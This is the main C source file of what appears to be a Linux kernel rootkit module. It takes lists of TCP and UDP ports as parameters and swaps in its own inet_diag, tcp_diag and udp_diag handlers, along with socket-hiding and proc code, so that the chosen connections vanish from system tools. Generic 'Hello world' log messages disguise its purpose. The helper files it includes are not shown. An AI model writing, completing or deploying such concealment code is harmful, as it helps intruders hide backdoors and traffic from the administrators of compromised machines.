#include <linux/module.h>
#include <linux/inet_diag.h>
#include <linux/sock_diag.h>
#include <linux/tcp.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/reboot.h>
#include <asm/paravirt.h>
#include "sysmap.h"

int tcp_ports[1024], udp_ports[1024];
int tcp_count = 0, udp_count = 0;
module_param_array(tcp_ports, int, &tcp_count, 0);
module_param_array(udp_ports, int, &udp_count, 0);

bool should_hide(int proto, int port)
{
    int* ports;
    int nports, i;

    switch (proto)
    {
    case IPPROTO_TCP:
        ports = tcp_ports;
        nports = tcp_count;
        break;

    case IPPROTO_UDP:
        ports = udp_ports;
        nports = udp_count;
        break;

    default:
        nports = 0;
        break;
    }

    for (i = 0; i < nports; i++)
        if (ports[i] == port)
            return true;

    return false;
}

#include "inet_diag.orig.c"
#include "tcp_diag.c"
#include "udp_diag.c"
#include "socket_hiding.c"

int init_module(void){
    printk(KERN_INFO "Hello world\n");

    inet_diag_init();
    tcp_diag_init();
    udp_diag_init();

    init_procstuff();

    return 0;
}

void cleanup_module(void){
    printk(KERN_INFO "Goodbye world\n");

    udp_diag_exit();
    tcp_diag_exit();
    inet_diag_exit();

    cleanup_procstuff();

    return;
}

MODULE_LICENSE("GPL");
